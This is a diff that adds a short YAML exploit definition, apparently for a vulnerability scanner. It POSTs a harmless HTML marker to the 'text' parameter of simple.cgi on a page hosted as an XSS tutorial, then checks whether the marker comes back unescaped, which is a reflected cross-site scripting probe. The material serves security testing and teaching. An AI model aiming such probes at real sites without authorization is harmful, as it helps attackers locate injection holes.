@@ -1,0 +1,18 @@
+name: metadata
+module: metadata
+parameter:
+  cvss: 5.0
+  author: Robin Verton
+---
+name: exploit
+description: Exploit the 'text' parameter on simple.cgi to output unescaped html.
+module: http
+parameter:
+    url: https://steve.fi/Security/XSS/Tutorial/simple.cgi
+    method: POST
+    headers:
+        User-Agent: Mozilla/5.0
+        Content-Type: application/x-www-form-urlencoded
+    body:
+        text: <div id=explo>explo</div>
+    find: <div id=explo>explo</div>
